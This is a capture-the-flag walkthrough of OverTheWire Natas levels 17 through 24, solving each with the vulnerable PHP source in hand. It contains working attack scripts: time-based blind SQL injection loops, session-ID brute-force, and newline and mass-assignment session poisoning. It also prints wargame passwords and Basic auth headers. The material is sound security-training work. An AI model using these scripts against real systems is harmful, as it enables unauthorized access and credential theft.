[+] Password: 8Ps3H0
[+] Password: 8Ps3H0G
[+] Password: 8Ps3H0GW
[+] Password: 8Ps3H0GWb
[+] Password: 8Ps3H0GWbn
[+] Password: 8Ps3H0GWbn5
[+] Password: 8Ps3H0GWbn5r
[+] Password: 8Ps3H0GWbn5rd
[+] Password: 8Ps3H0GWbn5rd9
[+] Password: 8Ps3H0GWbn5rd9S
[+] Password: 8Ps3H0GWbn5rd9S7
[+] Password: 8Ps3H0GWbn5rd9S7G
[+] Password: 8Ps3H0GWbn5rd9S7Gm
[+] Password: 8Ps3H0GWbn5rd9S7GmA
[+] Password: 8Ps3H0GWbn5rd9S7GmAd
[+] Password: 8Ps3H0GWbn5rd9S7GmAdg
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQ
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQN
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNd
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

## Natas17

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
natas18" and sleep(3) #
```

```
curl -o /dev/null -s -X POST "http://natas17.natas.labs.overthewire.org/index.php" -H "Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==" --data "username=natas18"%"22+and++sleep"%"283"%"29+"%"23" -w %{time_total}
```

```
natas18" AND IF(1=1, SLEEP(3), 0)#
```

```
natas18" AND IF((SELECT MID(username, 1, 1) FROM users WHERE 
username="natas18")='n', SLEEP(3), 0) #
```


```bash
passwordlenght=32
CurrentChar=0
password=""
sleeptime=10
MIDCounter=1
while [ $CurrentChar -ne $passwordlenght ]
do
    for letter in {{a..z},{A..Z},{0..9}}; do
        injection="\" AND IF((SELECT MID(password, 1, $MIDCounter) FROM users WHERE username=\"natas18\")='$password$letter', SLEEP($sleeptime), 0) #"
        #echo $injection
        data="username=natas18$injection"
        curl_output=$(curl -o /dev/null -s  'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' -d "$data" -w %{time_total})
        time=$(echo $curl_output | cut -d "." -f 1)
        if [ $time -ge 10 ]; then
            password="${password}${letter}"
            CurrentChar=$(( $CurrentChar + 1 ))
            MIDCounter=$(( $MIDCounter + 1 ))
            echo "[+] Password: $password"
            continue 2
        fi
    done
done
```

works, but case insensative.

```
[+] Password: x
[+] Password: xv
[+] Password: xvk
[+] Password: xvki
[+] Password: xvkiq
[+] Password: xvkiqd
[+] Password: xvkiqdj
[+] Password: xvkiqdjy
```

```bash
passwordlenght=32
CurrentChar=0
password=""
sleeptime=10
while [ $CurrentChar -ne $passwordlenght ]
do
    for letter in {{a..z},{A..Z},{0..9}}; do
        injection="\" AND IF(password LIKE BINARY \"$password$letter%\", SLEEP($sleeptime), 0) #"
        data="username=natas18$injection"
        curl_output=$(curl -o /dev/null -s  'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' -d "$data" -w %{time_total})
        time=$(echo $curl_output | cut -d "." -f 1)
        if [ $time -ge 10 ]; then
            password="${password}${letter}"
            CurrentChar=$(( $CurrentChar + 1 ))
            MIDCounter=$(( $MIDCounter + 1 ))
            echo "[+] Password: $password"
            continue 2
        fi
    done
done
```

```
+] Password: x
[+] Password: xv
[+] Password: xvK
[+] Password: xvKI
[+] Password: xvKIq
[+] Password: xvKIqD
[+] Password: xvKIqDj
[+] Password: xvKIqDjy
[+] Password: xvKIqDjy4
[+] Password: xvKIqDjy4O
[+] Password: xvKIqDjy4OP
[+] Password: xvKIqDjy4OPv
[+] Password: xvKIqDjy4OPv7
[+] Password: xvKIqDjy4OPv7w
[+] Password: xvKIqDjy4OPv7wC
[+] Password: xvKIqDjy4OPv7wCR
[+] Password: xvKIqDjy4OPv7wCRg
[+] Password: xvKIqDjy4OPv7wCRgD
[+] Password: xvKIqDjy4OPv7wCRgDl
[+] Password: xvKIqDjy4OPv7wCRgDlm
[+] Password: xvKIqDjy4OPv7wCRgDlmj
[+] Password: xvKIqDjy4OPv7wCRgDlmj0
[+] Password: xvKIqDjy4OPv7wCRgDlmj0p
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pF
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFs
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsC
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCs
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsD
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

## Natas18

```php
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
```

probally somthing in the cookie with PHPSESSID= 
{"PHPSESSID":{"httpOnly":true,"path":"/","value":"238"}}

No idea how it works. Lets figure it out  

```
Okay so when you load the page it the following happens:
    A maxid is set to 640
    showform is set to true;
    If my_session_start returns TRUE:
        it will call print_credentials.
        set showform to false
    Else:
        check if a username and password has been send, ifso:
            call createID with the username as input and give the output to session_id
            run session_start
            It then sets a custom session variable called admin using a function called isvalidadminlogin; this function though has been disabled and now does not return 1 but simply returns nothing.
            set showform to false
            call print_credentials.

What does my_session_start do ?
if PHPSESSID is in the cookie and the PHPSESSID is valid (numaric number):
    run session start:
        if it failes, 
            return false
        else 
            check if admin exists in $_SESSION ifso
                set admin to zero.
        return true.

What does print_credentials do ?
    if the custom session variable admin exits and if its been set to one we will be granted a admin session
    anything else is a normal user session

What does createID do ?
    Generate a random interger between 1 and the maxid (which is 640)

what does session_id do ?
    session_id() is used to get or set the session id for the current session.
    If id is specified, it will replace the current session id. session_id() needs to be called before session_start() for that purpose.

What does session_start do ?
    session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.


So how can we break this ?
    my_session_start checks if there is a valid PHPSESSID, it will then start the session with that id.
    If there is currently a PHPSESSID for a admin session, and we correctly guess this, we could get a admin session. This way we entirely skip the $_SESSION["admin"] = isValidAdminLogin() since this will only be checked/set if my_session_start returns false or if it exists.
    Since the maxid is been set to 640 this should be brute forceable.
``` 

Doing the breakiage.

```bash
MaxCookieID=640
CurrentID=0
while [ $CurrentID -ne $MaxCookieID ]
do
    CurrentID=$(( $CurrentID + 1 ))
    SessionCookie="PHPSESSID=$CurrentID"
    curl_output=$(curl -s $'http://natas18.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' --cookie "$SessionCookie" --data 'username=admin&password=password')
    if echo $curl_output | grep -q "regular user"; then
        echo "[-] $CurrentID out of $MaxCookieID is not a admin session."
    else
        echo "[+] $CurrentID out of $MaxCookieID is a admin session."
        echo "[+] $(echo $curl_output | grep Password | cut -d "<" -f 1 )"
        break
    fi
done
``` 

```bash
[-] 1 out of 640 is not a admin session.
[-] 2 out of 640 is not a admin session.
[-] 3 out of 640 is not a admin session.
[-] 4 out of 640 is not a admin session.
[-] 5 out of 640 is not a admin session.
[-] 6 out of 640 is not a admin session.
[-] 7 out of 640 is not a admin session.
[-] 8 out of 640 is not a admin session.
[-] 9 out of 640 is not a admin session.
...
[-] 115 out of 640 is not a admin session.
[-] 116 out of 640 is not a admin session.
[-] 117 out of 640 is not a admin session.
[-] 118 out of 640 is not a admin session.
[+] 119 out of 640 is a admin session.
[+] Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

## Natas19

```html
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.
``` 

Lets bake some cookies.

```
for n in {0..1000}; do
    curl -v -s 'http://natas19.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --data 'username=admin&password=password' 2>&1 | grep PHP
done

< Set-Cookie: PHPSESSID=312d61646d696e; path=/; HttpOnly
< Set-Cookie: PHPSESSID=312d61646d696e; path=/; HttpOnly
< Set-Cookie: PHPSESSID=332d61646d696e; path=/; HttpOnly
< Set-Cookie: PHPSESSID=342d61646d696e; path=/; HttpOnly
...
< Set-Cookie: PHPSESSID=3633352d61646d696e; path=/; HttpOnly
< Set-Cookie: PHPSESSID=3633352d61646d696e; path=/; HttpOnly
< Set-Cookie: PHPSESSID=3633372d61646d696e; path=/; HttpOnly
< Set-Cookie: PHPSESSID=3633382d61646d696e; path=/; HttpOnly
```


And lets get all the unique PHPSESSID's and sort them.

```
312d61646d696e
332d61646d696e
342d61646d696e
352d61646d696e
...
3633372d61646d696e
3633382d61646d696e
3633392d61646d696e
3634302d61646d696e
```


Looks like there is a fixed value and a variable value in the PHPSESSID 
```
XX     + 2d61646d696e
XXXX   + 2d61646d696e
XXXXXX + 2d61646d696e
```

The unfixed value is always 2 4 or 6 chars long.
ASCII in HEX is 2 chars log. Let check that.

```
~# xxd -ps -r phpsessionid.hex  phpsessionid.txt
~# cat phpsessionid.txt
1-admin
3-admin
4-admin
...
637-admin
638-admin
639-admin
640-admin
```

So we have a random number between 1 and 640 again, only with -admin added.  
Lets first just try admin (61646d696e) if that doenst work, lets brute force it.

nope

```bash
SessionCookie="PHPSESSID=61646d696e"
curl_output=$(curl -s $'http://natas19.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --cookie "$SessionCookie" --data 'username=admin&password=password')

echo $curl_output 
 </html> logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>al...</head>thewire.org/js/wechall.js"></script>
```

Script

```bash
MaxCookieID=640
CurrentID=0
while [ $CurrentID -ne $MaxCookieID ]
do
    CurrentID=$(( $CurrentID + 1 ))
    CurrentIDHEX=$(echo -n "$CurrentID-admin" | xxd -p)
    SessionCookie="PHPSESSID=$CurrentIDHEX"
    curl_output=$(curl -s $'http://natas19.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --cookie "$SessionCookie" --data 'username=admin&password=password')
    if echo $curl_output | grep -q "regular user"; then
        echo "[-] $CurrentID out of $MaxCookieID is not a admin session."
    else
        echo "[+] $CurrentID out of $MaxCookieID is a admin session."
        echo "$(echo $curl_output | grep Password)"
        break
    fi
done
```

Output

```
[-] 1 out of 640 is not a admin session.
[-] 2 out of 640 is not a admin session.
[-] 3 out of 640 is not a admin session.
[-] 4 out of 640 is not a admin session.
...
[-] 278 out of 640 is not a admin session.
[-] 279 out of 640 is not a admin session.
[-] 280 out of 640 is not a admin session.
[+] 281 out of 640 is a admin session.
</html> an admin. The credentials for the next level are:<br><pre>Username: natas20 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>script>
```

eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

## natas21 
```php
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
``` 

Thought it had something todo with the SID. Could not figure it out. 

Used a write up to get a hint for the newline (\n).

Everything in $_SESSION is added to data with a newline delimiter by the mywrite function. Data is then written to a session file.


```php
ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);    
```

https://www.php.net/manual/en/function.explode.php  
explode — Split a string by a string


Everything written in session file is read by the myread function. 

Spaces in files are used by explode to split the string.
as long as the first part is not equal to "" the first part and seccond part of the explode are added back in the global $_SESSION variable.

```php
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
```

This means if we write a session file that has 2 lines like this.
```
name somename
admin 1
```

the read function will do the following.

```PHP
$_SESSION[name] = somename
$_SESSION[admin] = 1
```

this will then pass the print_credentials check.
How do we do this ? Add a newline to the input.   

admin\nadmin 1


```
POST /index.php HTTP/1.1
Host: natas20.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Authorization: Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==
Connection: close
Referer: http://natas20.natas.labs.overthewire.org/index.php
Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=sess
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

name=admin%0Aadmin%201
``` 

After running this port request a session file for `PHPSESSID=sess` has been created with the extra admin 1 value.
If we load this PHPSESSID we will pass the admin check.


``` 
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
``` 

## natas22 

```php
<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?> 
``` 

```php
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>
```


goal, get admin=1 in the $_SESSION

Could not figure out what todo next.  Used write up to understand what was going on.

It was actully rather simple. The main page will print the password if admin=1 is in $_SESSION. We can add this on the second page.  

Since both pages seem to share PHPSESSIDs we should be able to abuse page 2 to influcense page 1.

A var called validkeys is setup, it then uses these validkeys as default values.and updates these values if they exists, if not it adds them

```php
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
```

However, above this code is this peace. This code checks if submit is in the $_REQUEST global variable. If it is it adds everything thats in $_REQUEST to $_SESSION.

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

This means if during a request that uses submit we can add our of values to the $_SESSION variable. If we add &admin=1 we will pass the print_credentials() check on the main page.

```
POST /index.php?debug HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
Connection: close
Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1

HTTP/1.0 200 OK
Date: Mon, 23 Sep 2019 12:09:42 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1015
Content-Type: text/html; charset=UTF-8
X-Cache: MISS from localhost
Via: 1.1 localhost:3128 (squid/2.7.STABLE9)
Connection: close
```

```php
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
    [debug] => 
    [align] => center
    [fontsize] => 100%
    [bgcolor] => yellow
    [submit] => Update
    [admin] => 1
)
``` 
This means that our PHPSESSID now has admin=1

If we send a request to the main page with below PHPSESSID we will pass the admin check.  
PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7 

```
GET /index.php HTTP/1.1
Host: natas21.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
Connection: close
Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7
Upgrade-Insecure-Requests: 1

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>

``` 

chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ


## natas22

``` php
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

```

If revelio is in $_GET and admin is not set add a location header. This will result in a 302 redirect. Then, if revelio is in the $_GET request show the password.  

We can set revelio with teh following params.   
natas22.natas.labs.overthewire.org/?revelio=a  

but if we do we get redirected.

Tried messing with the location cookie in the request. Turned out its way simpler, dont follow the 302.  

Burp -> look at request that gets 302'ed.
```
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
```

D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE


## natas23

```
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

```php
if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

Could not figure this one out. After reading up on a write up, some PHP documentation and testing it myself I now understand what happens.

https://www.php.net/manual/en/function.strstr.php  
https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion  
https://stackoverflow.com/questions/672040/comparing-string-to-integer-gives-strange-results  
https://n0j.github.io/2017/03/23/otw-natas-23.html  
https://blog.anshumanonline.com/natas24/   


```
strstr — Find the first occurrence of a string
```

```
Now, PHP has a property that on comparison with numerals, the string will evaluate as numerals. If the string has a ‘e’ in it, it will be evaluated as a float variable, otherwise an int. Since there is necessarily an ‘e’ in our string (because of the “iloveyou”), our passwd will be evaluated as a float. Another interesting thing is that, while this comparison, the value of the string being evaluated as a numeral will be from the initial part of the string. If there is no numeral in the initial part, the evaluation will return as 0.
```

```
When a string is evaluated in a numeric context, the resulting value and type are determined as follows.

The string will be evaluated as a float if it contains any of the characters '.', 'e', or 'E'. Otherwise, it will be evaluated as an integer.

The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero). Valid numeric data is an optional sign, followed by one or more digits (optionally containing a decimal point), followed by an optional exponent. The exponent is an 'e' or 'E' followed by one or more digits.
```

```
The == operator is a loosely-typed comparison. It will convert both to a common type and compare them. The way strings are converted to integers is explained here.

Note that the page you linked to doesn't contradict this. Check the second table, where it says that comparing the integer 0 to a string "php" using == shall be true.

What happens is that the string is converted to integer, and non-numeric strings (strings that do not contain or begin with a number) convert to 0.```

A string that consists of a number, or begins with a number, is considered a numeric string. If the string has other characters after that number, these are ignored.

If a string starts with a character that cannot be interpreted as part of a number, then it is a non-numeric string and will convert to 0. This doesn't mean that a numeric string has to start with a digit (0-9) - for example "-1" is a numeric string because the minus sign is part of a number in that case.

So for example, your string "d85d1d81b25614a3504a3d5601a9cb2e" does not start with a number, so it would convert to 0. But your second string "3581169b064f71be1630b321d3ca318f" would be converted to integer 3581169. So that's why your second test does not work the same way.
```

```php
strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string
```

```
haystack
    The input string.

needle
    If needle is not a string, it is converted to an integer and applied as the ordinal value of a character. This behavior is deprecated as of PHP 7.3.0, and relying on it is highly discouraged. Depending on the intended behavior, the needle should either be explicitly cast to string, or an explicit call to chr() should be performed.

before_needle
    If TRUE, strstr() returns the part of the haystack before the first occurrence of the needle (excluding the needle).

```

```php
if(strstr("11aaaaaailoveyou","iloveyou")){echo "a";}
a

if("11iloveyou" > 10 ){echo "a";}
a
```

So what happens is that even though our string starts with 11, it passes whte strstr check. 
Why ? Becase strstr checks for the first occurrence of a string. It does not verify if the string is an exact match.   
As long as iloveyou ocourse somewhere in the string it will return true.

```php
if(strstr("11aaaaaailoveyou","iloveyou")){echo "a";}
a
```

Then, duo the type conversion to a float (since our string contains a e) the iloveyou part is removed during the int check.

```
When a string is evaluated in a numeric context, the resulting value and type are determined as follows.
The string will be evaluated as a float if it contains any of the characters '.', 'e', or 'E'. Otherwise, it will be evaluated as an integer.
```

```php
php > $a=(float)"11iloveyou";
php > var_dump($a);
float(11)
php > echo $a;
11
if("11iloveyou" > 10 ){echo "a";}
a
```

The credentials for the next level are:

Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg


## natas24

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

https://www.php.net/manual/en/function.strcmp.php

```
Returns < 0 if str1 is less than str2; 
